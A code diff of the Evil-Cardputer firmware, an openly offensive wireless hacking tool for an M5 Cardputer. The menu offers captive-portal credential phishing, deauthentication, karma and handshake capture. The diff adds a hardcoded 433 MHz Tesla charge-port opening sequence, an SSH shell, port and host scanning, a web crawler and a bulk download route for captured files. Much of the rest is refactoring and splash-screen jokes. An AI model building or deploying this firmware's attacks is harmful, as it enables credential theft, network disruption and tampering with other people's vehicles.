@@ -28,8 +28,9 @@
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
 */
-// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
+// remember to change hardcoded password and configuration below in the code to ensure no unauthorized access : !!!!!! CHANGE THIS !!!!!
 // no bluetooth serial due to only BLE
+
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -43,8 +44,12 @@
 #include "M5Cardputer.h"
 #include <ArduinoJson.h>
 #include "BLEDevice.h"
-#include <vector>
 #include <esp_task_wdt.h>
+
+#include <HTTPClient.h>
+#include <WiFiClientSecure.h>
+#include <WiFiClient.h>
+
 
 //deauth
 #include "esp_wifi_types.h"
@@ -58,6 +63,35 @@
 #include <algorithm>
 #include <regex>
 //sniff and deauth client end
+
+
+
+String scanIp = "";
+#include <lwip/etharp.h>
+#include <lwip/ip_addr.h>
+#include <ESPping.h>
+
+//ssh
+#include "libssh_esp32.h"
+#include <libssh/libssh.h>
+
+//!!!!!! CHANGE THIS !!!!!
+//!!!!!! CHANGE THIS !!!!!
+// if needed change default ssh credentials and info to use (can be used with ssh on internet)
+String ssh_user = "";
+String ssh_host = "";
+String ssh_password = "";
+int ssh_port = 22;
+//!!!!!! CHANGE THIS !!!!!
+//!!!!!! CHANGE THIS !!!!!
+
+
+// SSH session and channel
+ssh_session my_ssh_session;
+ssh_channel my_channel;
+//ssh end
+
+
 
 extern "C" {
 #include "esp_wifi.h"
@@ -74,7 +108,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Set Wifi SSID", "Set Wifi Password", "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam" , "Deauther", "Client Sniffing and Deauth", "Handshake/Deauth Sniffing", "Check Handshakes", "Wall Of Flipper"};
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Set Wifi SSID", "Set Wifi Password", "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam" , "Deauther", "Client Sniffing and Deauth", "Handshake/Deauth Sniffing", "Check Handshakes", "Wall Of Flipper", "Send Tesla Code", "Connect to network" , "SSH Shell", "Scan IP Ports", "Scan Network Hosts" , "Web Crawler"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 8;
@@ -88,10 +122,11 @@ String clonedSSID = "Evil-Cardputer";
 int topVisibleIndex = 0;
 
 // Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time
-// experimental
-const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
-const char* password = ""; // wifi password
-
+//!!!!!! CHANGE THIS !!!!!
+//!!!!!! CHANGE THIS !!!!!
+// ssid to connect,connection skipped at boot if stay blank (can be shutdown by different action like probe attack)
+const char* ssid = "";  // wifi AP SSID to connect to automatically at boot
+const char* password = ""; // wifi AP password
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 // password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
@@ -189,24 +224,10 @@ void setColorRange(int startPixel, int endPixel, uint32_t color) {
 
 //led part end
 
-// sd
-/*
-  #define SCK  7
-  #define MISO 8
-  #define MOSI 6
-*/
-// end sd
-
-
-TinyGPSPlus gps;
-HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
-
 bool isItSerialCommand = false;
 
 
-
 // deauth and pwnagotchi detector part
-
 const long channelHopInterval = 5000; // hoppping time interval
 unsigned long lastChannelHopTime = 0;
 int currentChannelDeauth = 1;
@@ -217,7 +238,6 @@ unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l
 char macBuffer[18];
 int maxChannelScanning = 13;
 
-
 int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
 int nombreDeDeauth = 0;
 int nombreDeEAPOL = 0;
@@ -225,7 +245,6 @@ File pcapFile;
 // deauth and pwnagotchi detector end
 
 // Sniff and deauth clients
-
 std::map<std::string, std::vector<std::string>> connections;
 std::map<std::string, std::string> ap_names;
 std::set<int> ap_channels;
@@ -251,6 +270,45 @@ bool isDeauthFast = false;
 
 // Sniff and deauth clients end
 
+//Send Tesla code
+#include <driver/rmt.h>
+
+#define RF433TX
+
+#define RMT_TX_CHANNEL  RMT_CHANNEL_0
+#define RTM_BLOCK_NUM   1
+
+#define RMT_CLK_DIV   80 /*!< RMT counter clock divider */
+#define RMT_1US_TICKS (80000000 / RMT_CLK_DIV / 1000000)
+
+rmt_item32_t rmtbuff[2048];
+
+const uint8_t signalPin = 2;                   // Pin de sortie pour le signal
+const uint16_t pulseWidth = 400;                // Microseconds
+const uint16_t messageDistance = 23;            // Millis
+const uint8_t transmissions = 6;                // Number of repeated transmissions
+const uint8_t messageLength = 43;
+
+//Tesla Open port sequence
+const uint8_t sequence[messageLength] = {
+  0x02, 0xAA, 0xAA, 0xAA, // Preamble of 26 bits by repeating 1010
+  0x2B,                 // Sync byte
+  0x2C, 0xCB, 0x33, 0x33, 0x2D, 0x34, 0xB5, 0x2B, 0x4D, 0x32, 0xAD, 0x2C, 0x56, 0x59, 0x96, 0x66,
+  0x66, 0x5A, 0x69, 0x6A, 0x56, 0x9A, 0x65, 0x5A, 0x58, 0xAC, 0xB3, 0x2C, 0xCC, 0xCC, 0xB4, 0xD2,
+  0xD4, 0xAD, 0x34, 0xCA, 0xB4, 0xA0
+};
+
+//Send Tesla code end
+
+
+TinyGPSPlus gps;
+HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
+
+
+void webCrawling(const String &urlOrIp = "");
+void webCrawling(const IPAddress &ip);
+
+
 
 void setup() {
   M5.begin();
@@ -259,7 +317,8 @@ void setup() {
   M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(TFT_WHITE);
   M5.Display.setTextFont(1);
-
+  pinMode(signalPin, OUTPUT);
+  digitalWrite(signalPin, LOW);
   const char* startUpMessages[] = {
     "  There is no spoon...",
     "    Hack the Planet!",
@@ -398,6 +457,152 @@ void setup() {
     "Navigating the Multiverse",
     "    Affirmative Dave,\n        I read you.",
     "  Your Evil-M5Core2 have\n     died of dysentery",
+    " Did you disable PSRAM ?",
+    "You already star project?",
+    "Rick's Portal Gun Activated...",
+    "Engaging in Plumbus Assembly...",
+    "Wubba Lubba Dub Dub!",
+    "Syncing with Meeseeks Box...",
+    "Searching for Szechuan Sauce...",
+    "Scanning Galactic Federation...",
+    "Exploring Dimension C-137...",
+    "Navigating the Citadel...",
+    "Jerry's Dumb Ideas Detected...",
+    "Engaging in Ricksy Business...",
+    "Morty's Mind Blowers Loading...",
+    "Tuning into Interdimensional Cable...",
+    "Hacking into Council of Ricks...",
+    "Deploying Mr. Poopybutthole...",
+    "Vindicators Assemble...",
+    "Snuffles the Smart Dog Activated...",
+    "Using Butter Robot...",
+    "Evil Morty Schemes Unfolding...",
+    "Beth's Cloning Facility Accessed...",
+    "Listening to Get Schwifty...",
+    "Birdperson in Flight...",
+    "Gazorpazorpfield Hates Mondays...",
+    "Tampering with Time Crystals...",
+    "Engaging Space Cruiser...",
+    "Gazorpazorp Emissary Arrived...",
+    "Navigating the Cronenberg World...",
+    "Using Galactic Federation Currency...",
+    "Galactic Adventure Awaits...",
+    "Plumbus Maintenance In Progress...",
+    "Taming the Dream Inceptors...",
+    "Mr. Goldenfold's Nightmare...",
+    "Hacking into Unity's Mind...",
+    "Beta 7 Assimilation in Progress...",
+    "Purging the Planet...",
+    "Planet Music Audition...",
+    "Hacking into Rick's Safe...",
+    "Extracting from Parasite Invasion...",
+    "Scanning for Evil Rick...",
+    "Preparing for Jerryboree...",
+    "Plutonian Negotiations...",
+    "Tiny Rick Mode Activated...",
+    "Scanning for Cromulons...",
+    "Decoding Rick's Blueprints...",
+    "Breaking the Fourth Wall...",
+    "Jerry's App Idea Rejected...",
+    "Galactic Federation Hacked...",
+    "Portal Gun Battery Low...",
+    "ccessing Anatomy Park...",
+    "Interdimensional Travel Commencing...",
+    "Vampire Teacher Alert...",
+    "Navigating Froopyland...",
+    "Synchronizing with Butter Bot...",
+    "Unity Connection Established...",
+    "Evil Morty Conspiracy...",
+    "Listening to Roy: A Life Well Lived...",
+    "Galactic Government Overthrown...",
+    "Scanning for Gearhead...",
+    "Engaging Heist-o-Tron...",
+    "Confronting Scary Terry...",
+    "Engaging in Squanching...",
+    "Learning from Birdperson...",
+    "Dimension Hopping Initiated...",
+    "Morty Adventure Card Filled...",
+    "Engaging Operation Phoenix...",
+    "Developing Dark Matter Formula...",
+    "Teleporting to Bird World...",
+    "Exploring Blips and Chitz...",
+    "Synchronizing with Noob Noob...",
+    "Plumbus Optimization...",
+    "Beth's Self-Discovery Quest...",
+    "Extracting from Galactic Prison...",
+    "Taming the Zigerion Scammers...",
+    "Dimension C-500k Travel...",
+    "Sneaking into Birdperson's Wedding...",
+    "Preparing Microverse Battery...",
+    "Vindicator Call Initiated...",
+    "Evil Morty Tracking...",
+    "Snuffles' Revolution...",
+    "Navigating Abadango Cluster...",
+    "Syncing with Phoenix Person...",
+    "Stealing from Devil's Antique Shop...",
+    "Beth's Horse Surgeon Adventures...",
+    "Engaging Purge Planet...",
+    "Evil Morty Plans Detected...",
+    "Exploring the Thunderdome...",
+    "Extracting Toxic Rick...",
+    "Tiny Rick Singing...",
+    "Birdperson's Memories...",
+    "Intergalactic Criminal Record...",
+    "Dismantling Unity's Hive Mind...",
+    "Engaging with Snuffles...",
+    "Exploring Anatomy Park...",
+    "Rewiring Rick's Mind...",
+    "Scanning for Sleepy Gary...",
+    "Navigating the Narnian Box...",
+    "Engaging Rick's AI Assistant...",
+    "Synchronizing with Beth's Clone...",
+    "Preparing for Ricklantis Mixup...",
+    "Morty's Science Project...",
+    "Portal Gun Malfunction...",
+    "Galactic Federation Detected...",
+    "Jerry's Misadventures...",
+    "Engaging Operation Phoenix...",
+    "Scanning for Snowball...",
+    "Morty's Science Project...",
+    "Evil Morty's Reign...",
+    "Navigating Purge Planet...",
+    "Rick's Memories Unlocked...",
+    "Synchronizing with Tinkles...",
+    "Galactic Federation Hacked...",
+    "Rick's AI Assistant Activated...",
+    "Exploring Zigerion Base...",
+    "Beth's Identity Crisis...",
+    "Galactic Federation Overthrown...",
+    "Scanning for Phoenix Person...",
+    "Rick's Safe Hacked...",
+    "Morty's Adventure Awaits...",
+    "Synchronizing with Snowball...",
+    "Evil Morty Conspiracy...",
+    "Galactic Adventure Awaits...",
+    "Rick's AI Assistant Activated...",
+    "Interdimensional Cable Tuning...",
+    "Navigating Zigerion Base...",
+    "Morty's School Science Project...",
+    "Rick's Portal Gun Malfunction...",
+    "Engaging Ricklantis Mixup...",
+    "Galactic Federation Hacked...",
+    "Beth's Clone Identified...",
+    "Synchronizing with Phoenix Person...",
+    "Galactic Government Overthrown...",
+    "Listening to Get Schwifty...",
+    "Rick's Safe Hacked...",
+    "Morty's Mind Blowers Loaded...",
+    "Engaging Galactic Federation...",
+    "Scanning for Snowball...",
+    "Evil Morty's Reign Initiated...",
+    "Navigating Purge Planet...",
+    "Synchronizing with Tinkles...",
+    "Galactic Federation Hacked...",
+    "Rick's Memories Unlocked...",
+    "Exploring Zigerion Base...",
+    "Beth's Identity Crisis...",
+    "Galactic Federation Overthrown...",
+    "Scanning for Phoenix Person...",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -473,7 +678,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.2.2 2024";
+  const char* text3 = "v1.2.6 2024";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -503,7 +708,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.2.2 2024");
+  Serial.println("v1.2.6 2024");
   Serial.println("-------------------");
   M5.Display.setCursor(0, textY + 80);
   M5.Display.println(randomMessage);
@@ -539,7 +744,7 @@ void setup() {
   }
 
   if (strcmp(ssid, "") != 0) {
-    WiFi.mode(WIFI_MODE_APSTA);
+    //WiFi.mode(WIFI_MODE_APSTA);
     WiFi.begin(ssid, password);
 
     unsigned long startAttemptTime = millis();
@@ -561,13 +766,13 @@ void setup() {
   }
 
   pixels.begin(); // led init
-  cardgps.begin(9600, SERIAL_8N1, 1, 2); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
-
-
+  cardgps.begin(9600, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
+  pinMode(signalPin, OUTPUT);
+  digitalWrite(signalPin, LOW);
   auto cfg = M5.config();
   M5Cardputer.begin(cfg, true);
-
   drawMenu();
+
 
 }
 
@@ -611,6 +816,7 @@ void firstScanWifiNetworks() {
 unsigned long previousMillis = 0;
 const long interval = 1000;
 
+void sshConnect(const char *host = nullptr);
 
 void loop() {
   M5.update();
@@ -742,6 +948,24 @@ void executeMenuItem(int index) {
     case 26:
       wallOfFlipper();
       break;
+    case 27:
+      sendTeslaCode();
+      break;
+    case 28:
+      connectWifi(currentListIndex);
+      break;
+    case 29:
+      sshConnect();
+      break;
+    case 30:
+      scanIpPort();
+      break;
+    case 31:
+      scanHosts();
+      break;
+    case 32:
+      webCrawling();
+      break;
   }
   isOperationInProgress = false;
 }
@@ -749,7 +973,13 @@ void executeMenuItem(int index) {
 unsigned long buttonPressTime = 0;
 bool buttonPressed = false;
 
-
+void enterDebounce() {
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+}
 
 void handleMenuInput() {
   static bool keyHandled = false;
@@ -1178,13 +1408,7 @@ void scanWifiNetworks() {
 
 void showWifiList() {
   bool needsDisplayUpdate = true;  // Flag pour déterminer si l'affichage doit être mis à jour
-
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   static bool keyHandled = false;
   while (!inMenu) {
     if (needsDisplayUpdate) {
@@ -1231,6 +1455,10 @@ void showWifiList() {
       waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
       needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
       keyHandled = true;
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      inMenu = true;
+      drawMenu();
+      break;
     } else if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
                !M5Cardputer.Keyboard.isKeyPressed('.') &&
                !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
@@ -1295,13 +1523,7 @@ void showWifiDetails(int networkIndex) {
 
   updateDisplay();
 
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
-
+  enterDebounce();
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
 
@@ -1445,6 +1667,7 @@ void createCaptivePortal() {
 
   server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
   server.on("/download-sd-file", HTTP_GET, handleFileDownload);
+  server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
   server.on("/list-directories", HTTP_GET, handleListDirectories);
 
   server.on("/uploadhtmlfile", HTTP_GET, []() {
@@ -1586,7 +1809,11 @@ String getDirectoryHtml(File dir, String path, String password) {
   html += "a{color:#007bff;text-decoration:none}";
   html += "a:hover{color:#0056b3}";
   html += ".red{color:red}";
-  html += "</style></head><body><ul>";
+  html += "</style></head>";
+
+  html += "<p><a href='/download-all-files?dir=" + path + "&pass=" + password + "'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Download All</button></a></p>";
+
+  html += "<body><ul>";
   if (path != "/") {
     String parentPath = path.substring(0, path.lastIndexOf('/'));
     if (parentPath == "") parentPath = "/";
@@ -1616,7 +1843,6 @@ String getDirectoryHtml(File dir, String path, String password) {
     file.close();
   }
   html += "</ul>";
-
   html += "<script>"
           "function confirmDelete(filename) {"
           "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
@@ -1670,6 +1896,56 @@ void handleFileDownload() {
   }
   server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
 }
+
+
+void handleDownloadAllFiles() {
+  String password = server.arg("pass");
+  if (password != accessWebPassword) {
+    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
+    return;
+  }
+
+  String dirPath = server.arg("dir");
+  if (dirPath == "") dirPath = "/";
+
+  File dir = SD.open(dirPath);
+  if (!dir || !dir.isDirectory()) {
+    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
+    return;
+  }
+
+  String boundary = "MULTIPART_BYTERANGES";
+
+  // Début de la réponse multipart
+  String responseHeaders = "HTTP/1.1 200 OK\r\n";
+  responseHeaders += "Content-Type: multipart/x-mixed-replace; boundary=" + boundary + "\r\n";
+  responseHeaders += "Connection: close\r\n\r\n";
+  server.sendContent(responseHeaders);
+
+  while (File file = dir.openNextFile()) {
+    if (!file.isDirectory()) {
+      String header = "--" + boundary + "\r\n";
+      header += "Content-Type: application/octet-stream\r\n";
+      header += "Content-Disposition: attachment; filename=\"" + String(file.name()) + "\"\r\n";
+      header += "Content-Length: " + String(file.size()) + "\r\n\r\n";
+      server.sendContent(header);
+
+      uint8_t buffer[512];
+      while (size_t bytesRead = file.read(buffer, sizeof(buffer))) {
+        server.client().write(buffer, bytesRead);
+      }
+      server.sendContent("\r\n");
+    }
+    file.close();
+  }
+
+  // Fin de la réponse multipart
+  String footer = "--" + boundary + "--\r\n";
+  server.sendContent(footer);
+
+  dir.close();
+}
+
 
 
 void handleFileUpload() {
@@ -1978,11 +2254,7 @@ void changePortal() {
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
 
   // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
 
   while (!inMenu) {
     if (needDisplayUpdate) {
@@ -2028,6 +2300,10 @@ void changePortal() {
         Serial.println("-------------------");
         waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
         break; // Sortir de la boucle
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
+        break;
       }
 
       // Réinitialiser la gestion des touches une fois aucune n'est pressée
@@ -2069,13 +2345,7 @@ void checkCredentials() {
   int currentListIndex = 0;
   bool needDisplayUpdate = true;
 
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
-
+  enterDebounce();
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
 
@@ -2100,12 +2370,16 @@ void checkCredentials() {
         lastKeyPressTime = millis();
       } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
         break; // Exit the loop to return to the menu
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
+        break;
       }
     }
   }
   // Return to menu
   inMenu = true; // Assuming this flag controls whether you're in the main menu
-  drawMenu(); // Redraw the main menu
+  drawMenu(); //the main menu
 }
 
 
@@ -2161,12 +2435,12 @@ bool confirmPopup(String message) {
   bool decisionMade = false;
 
   M5.Display.clear();
-
+  M5.Display.setTextSize(1.5);
   int messageWidth = message.length() * 9;  // Each character is 6 pixels wide
   int startX = (M5.Display.width() - messageWidth) / 2;  // Calculate starting X position
 
   M5.Display.setCursor(startX, M5.Display.height() / 2);
-  M5.Display.setTextColor(TFT_WHITE);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.println(message);
 
   M5.Display.setTextColor(TFT_GREEN);
@@ -2177,7 +2451,7 @@ bool confirmPopup(String message) {
   M5.Display.setCursor(M5.Display.width() - 60, 110);
   M5.Display.print("N");
 
-  M5.Display.setTextColor(TFT_WHITE);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.display();
 
   while (!decisionMade) {
@@ -2243,18 +2517,33 @@ int countPasswordsInFile() {
 
 int oldNumClients = -1;
 int oldNumPasswords = -1;
-
+bool wificonnected = false;
+String wificonnectedPrint = "";
+String ipAddress = "";
 void displayMonitorPage1() {
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
   M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
 
+  if (WiFi.localIP().toString() != "0.0.0.0") {
+    wificonnected = true;
+    wificonnectedPrint = "Y";
+    ipAddress = WiFi.localIP().toString();
+  } else {
+    wificonnected = false;
+    wificonnectedPrint = "N";
+    ipAddress = "           ";
+  }
   M5.Display.setCursor(0, 45);
   M5.Display.println("SSID: " + clonedSSID);
   M5.Display.setCursor(0, 60);
   M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
   M5.Display.setCursor(0, 75);
   M5.Display.println("Page: " + selectedPortalFile.substring(7));
+  M5.Display.setCursor(0, 90);
+  M5.Display.println("Connected : " + wificonnectedPrint);
+  M5.Display.setCursor(0, 105);
+  M5.Display.println("IP : " + ipAddress);
 
   oldNumClients = -1;
   oldNumPasswords = -1;
@@ -2262,11 +2551,7 @@ void displayMonitorPage1() {
   M5.Display.display();
 
   // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
 
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
@@ -2307,7 +2592,7 @@ void displayMonitorPage1() {
       } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
         displayMonitorPage2();  // Navigate to the next page
         break;
-      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
         inMenu = true;
         drawMenu();
         break;
@@ -2380,7 +2665,7 @@ void displayMonitorPage2() {
       } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
         displayMonitorPage3();  // Navigate to the next page
         break;
-      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
         inMenu = true;
         drawMenu();
         break;
@@ -2433,11 +2718,9 @@ void displayMonitorPage3() {
   M5.Display.setTextSize(1.5);
   M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
 
-
   oldStack = getStack();
   oldRamUsage = getRamUsage();
   oldBatteryLevel = getBatteryLevel();
-  oldTemperature = getTemperature();
 
   M5.Display.setCursor(10 / 4, 15);
   M5.Display.println("Stack left: " + oldStack + " Kb");
@@ -2445,18 +2728,13 @@ void displayMonitorPage3() {
   M5.Display.println("RAM: " + oldRamUsage + " Mo");
   M5.Display.setCursor(10 / 4, 45);
   M5.Display.println("Batterie: " + oldBatteryLevel + "%");
-  M5.Display.setCursor(10 / 4, 60);
-  M5.Display.println("Temperature: " + oldTemperature + "C");
 
   M5.Display.display();
-
   lastUpdateTime = millis();
-
 
   oldStack = "";
   oldRamUsage = "";
   oldBatteryLevel = "";
-  oldTemperature = "";
 
   M5.Display.display();
 
@@ -2469,8 +2747,10 @@ void displayMonitorPage3() {
     M5Cardputer.update();
     delay(10);  // Small delay to reduce CPU load
   }
+
   while (!inMenu) {
-    M5.update(); M5Cardputer.update();
+    M5.update();
+    M5Cardputer.update();
     handleDnsRequestSerial();
 
     unsigned long currentMillis = millis();
@@ -2480,39 +2760,30 @@ void displayMonitorPage3() {
       String newStack = getStack();
       String newRamUsage = getRamUsage();
       String newBatteryLevel = getBatteryLevel();
-      String newTemperature = getTemperature();
+      int newBatteryCurrent = M5.Power.getBatteryCurrent();
 
       // Afficher les valeurs mises à jour
       if (newStack != oldStack) {
-        M5.Display.fillRect(10 / 4, 30 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-        M5.Display.setCursor(10 / 4, 30 / 2);
+        M5.Display.setCursor(10 / 4, 15);
         M5.Display.println("Stack left: " + newStack + " Kb");
         oldStack = newStack;
       }
 
       if (newRamUsage != oldRamUsage) {
-        M5.Display.fillRect(10 / 4, 60 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-        M5.Display.setCursor(10 / 4, 60 / 2);
+        M5.Display.setCursor(10 / 4, 30);
         M5.Display.println("RAM: " + newRamUsage + " Mo");
         oldRamUsage = newRamUsage;
       }
 
       if (newBatteryLevel != oldBatteryLevel) {
-        M5.Display.fillRect(10 / 4, 90 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-        M5.Display.setCursor(10 / 4, 90 / 2);
+        M5.Display.setCursor(10 / 4, 45);
         M5.Display.println("Batterie: " + newBatteryLevel + "%");
         oldBatteryLevel = newBatteryLevel;
       }
 
-      if (newTemperature != oldTemperature) {
-        M5.Display.fillRect(10 / 4, 120 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-        M5.Display.setCursor(10 / 4, 120 / 2);
-        M5.Display.println("Temperature: " + newTemperature + "C");
-        oldTemperature = newTemperature;
-      }
-
       lastUpdateTime = currentMillis;
     }
+
     if (millis() - lastKeyPressTime > debounceDelay) {
       if (M5Cardputer.Keyboard.isKeyPressed(',')) {
         displayMonitorPage2();  // Go back to the second page
@@ -2520,7 +2791,7 @@ void displayMonitorPage3() {
       } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
         displayMonitorPage1();  // Go back to the first page
         break;
-      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
         inMenu = true;
         drawMenu();
         break;
@@ -2529,6 +2800,7 @@ void displayMonitorPage3() {
     }
   }
 }
+
 
 
 void probeSniffing() {
@@ -2592,12 +2864,7 @@ void brightness() {
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200;  // Définir un délai de debounce de 200 ms
 
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
 
   while (true) {
     M5.update();
@@ -2615,6 +2882,10 @@ void brightness() {
         lastKeyPressTime = millis();
       } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
         saveConfigParameter("brightness", currentBrightness);
+        break;
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
         break;
       }
     }
@@ -2813,7 +3084,7 @@ void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
       M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
     }
   }
- if (count <= 9) {
+  if (count <= 9) {
     M5.Display.fillRect(M5.Display.width() - 15 * 1.5 / 2, 0, 15 * 1.5 / 2, 15, TFT_DARKGREEN);
     M5.Display.setCursor(M5.Display.width() - 13 * 1.5 / 2, 3);
   } else if (count >= 10 && count <= 99) {
@@ -2828,7 +3099,7 @@ void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
     M5.Display.fillRect(M5.Display.width() - 45 * 1.5 / 2, 0, 45 * 1.5 / 2, 15, TFT_RED);
     M5.Display.setCursor(M5.Display.width() - 42 * 1.5 / 2, 3);
   }
- if (count == MAX_SSIDS_Karma) {
+  if (count == MAX_SSIDS_Karma) {
     M5.Display.printf("MAX");
   } else {
     M5.Display.printf("%d", count);
@@ -2942,12 +3213,7 @@ void handleMenuInputKarma() {
   static unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
   static bool keyHandled = false;
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   M5.update();
   M5Cardputer.update();
 
@@ -3146,12 +3412,7 @@ void listProbes() {
 
   unsigned long lastKeyPressTime = 0;
